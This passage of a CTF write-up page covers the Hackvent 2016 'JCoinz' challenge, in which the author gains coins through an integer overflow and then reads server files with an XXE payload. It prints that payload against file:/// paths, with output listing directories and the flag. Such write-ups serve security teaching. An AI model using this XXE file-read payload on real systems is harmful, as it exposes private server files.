+&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM "file:///" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</pre></table></code></div></div><p>Yes! this works:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+</pre><td class="rouge-code"><pre>$ java -jar jcoinz.jar
+$$$$$$$$$$$$$$$$$$
+$ JCOINZ SERVICE $
+$$$$$$$$$$$$$$$$$$
+
+[..]
+
+1 - sends jcoinz to charity
+2 - send a secret xml message to the admin
+Your name: billy
+Your amount of jcoinz: 2147482308
+
+[?] Action: 2
+[-] Decreased the account of "billy" by 1337
+[?] XML Message: &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM "file:///" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+[+] Your secret xml message: &lt;foo&gt;.rpmdb
+bin
+boot
+cdrom
+dev
+etc
+export
+home
+initrd.img
+initrd.img.old
+lib
+lib32
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+&lt;/foo&gt;
+</pre></table></code></div></div><p>So we check in the <code class="language-plaintext highlighter-rouge">home</code> folder, and by repeatedly sending xml messages we eventually find a file in <code class="language-plaintext highlighter-rouge">/home/jcoinz</code> that contains the flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+</pre><td class="rouge-code"><pre>$ nc challenges.hackvent.hacking-lab.com 3117
+$$$$$$$$$$$$$$$$$$
+$ JCOINZ SERVICE $
+$$$$$$$$$$$$$$$$$$
+
+1 - sends jcoinz to charity
+2 - send a secret xml message to the admin
+Your name: billy
+Your amount of jcoinz: 1336
+
+[?] Action: 1
+[?] Amount of jcoinz to send: 1333
+[-] Decreased the account of "billy" by 1333
+[+] Thank you very much!
+
+1 - sends jcoinz to charity
+2 - send a secret xml message to the admin
+Your name: billy
+Your amount of jcoinz: 1
+
+[?] Action: 1
+[?] Amount of jcoinz to send: -2147483648
+[-] Decreased the account of "billy" by -2147483648
+[+] Thank you very much!
+
+1 - sends jcoinz to charity
+2 - send a secret xml message to the admin
+Your name: billy
+Your amount of jcoinz: 2147483647
+
+[?] Action: 2
+[-] Decreased the account of "billy" by 1337
+[?] XML Message: &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM "file:///home" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+[+] Your secret xml message: &lt;foo&gt;jcoinz
+&lt;/foo&gt;
+
+1 - sends jcoinz to charity
+2 - send a secret xml message to the admin
+Your name: billy
+Your amount of jcoinz: 2147480969
+
+[?] Action: 2
+[-] Decreased the account of "billy" by 1337
+[?] XML Message: &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM "file:///home/jcoinz" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+[+] Your secret xml message: &lt;foo&gt;9f40461baba9bf00ba9174beeeb9b8a80c0ffba6
+jcoinz.jar
+&lt;/foo&gt;
+
+1 - sends jcoinz to charity
+2 - send a secret xml message to the admin
+Your name: billy
+Your amount of jcoinz: 2147479630
+
+[?] Action: 2
+[-] Decreased the account of "billy" by 1337
+[?] XML Message: &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM "file:///home/jcoinz/9f40461baba9bf00ba9174beeeb9b8a80c0ffba6" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+[+] Your secret xml message: &lt;foo&gt;
+You did it!
+
+Greets, MuffinX
+
+HV16-y4h0-g00t-d33m-c01n-zzzz
+
+If you liked this challenge, tweet me: https://twitter.com/muffiniks
+&lt;/foo&gt;
+
+1 - sends jcoinz to charity
+2 - send a secret xml message to the admin
+Your name: billy
+Your amount of jcoinz: 2147478291
+
+[?] Action:
+</pre></table></code></div></div><h2> Flag</h2><code> HV16-y4h0-g00t-d33m-c01n-zzzz </code></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div class="panel-heading"> <a href="https://github.com/shiltemann/CTF-writeups-public/tree/main/website/writeups/Hackvent_2016/13-dec-13-jcoinz.md"><i class="fab fa-github"></i> Edit on GitHub </a></div><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li> <a href="/CTF-writeups-public/writeups/Hackvent_2016/16-dec-16-marshmallows.html">Dec 16: Marshmallows - (Hackvent_2016)</a><li> <a href="/CTF-writeups-public/writeups/Hackvent_2016/15-dec-15-sap---santas-admin-panel.html">Dec 15: SAP - Santas Admin Panel - (Hackvent_2016)</a><li> <a href="/CTF-writeups-public/writeups/Hackvent_2016/14-dec-14-radio-wargame.html">Dec 14: Radio Wargame - (Hackvent_2016)</a><li> <a href="/CTF-writeups-public/writeups/Hackvent_2016/13-dec-13-jcoinz.html">Dec 13: JCoinz - (Hackvent_2016)</a><li> <a href="/CTF-writeups-public/writeups/Hackvent_2016/12-dec-12-crypt-o-math.html">Dec 12: Crypt-o-Math - (Hackvent_2016)</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/CTF-writeups-public/tag/image/">image</a> <a class="post-tag" href="/CTF-writeups-public/tag/rsa/">RSA</a> <a class="post-tag" href="/CTF-writeups-public/tag/lsb/">LSB</a> <a class="post-tag" href="/CTF-writeups-public/tag/cipher/">cipher</a> <a class="post-tag" href="/CTF-writeups-public/tag/pcap/">pcap</a> <a class="post-tag" href="/CTF-writeups-public/tag/audio/">audio</a> <a class="post-tag" href="/CTF-writeups-public/tag/aws/">aws</a> <a class="post-tag" href="/CTF-writeups-public/tag/bash/">bash</a> <a class="post-tag" href="/CTF-writeups-public/tag/binwalk/">binwalk</a> <a class="post-tag" href="/CTF-writeups-public/tag/crib-dragging/">crib dragging</a></div></div></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/CTF-writeups-public/tag/image/">image</a> <a class="post-tag" href="/CTF-writeups-public/tag/rsa/">RSA</a> <a class="post-tag" href="/CTF-writeups-public/tag/lsb/">LSB</a> <a class="post-tag" href="/CTF-writeups-public/tag/cipher/">cipher</a> <a class="post-tag" href="/CTF-writeups-public/tag/pcap/">pcap</a> <a class="post-tag" href="/CTF-writeups-public/tag/audio/">audio</a> <a class="post-tag" href="/CTF-writeups-public/tag/aws/">aws</a> <a class="post-tag" href="/CTF-writeups-public/tag/bash/">bash</a> <a class="post-tag" href="/CTF-writeups-public/tag/binwalk/">binwalk</a> <a class="post-tag" href="/CTF-writeups-public/tag/crib-dragging/">crib dragging</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/shiltemann">Team Galaxians</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false" ><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/CTF-writeups-public/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script defer src="/CTF-writeups-public/assets/js/dist/commons.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/CTF-writeups-public/app.js"></script>
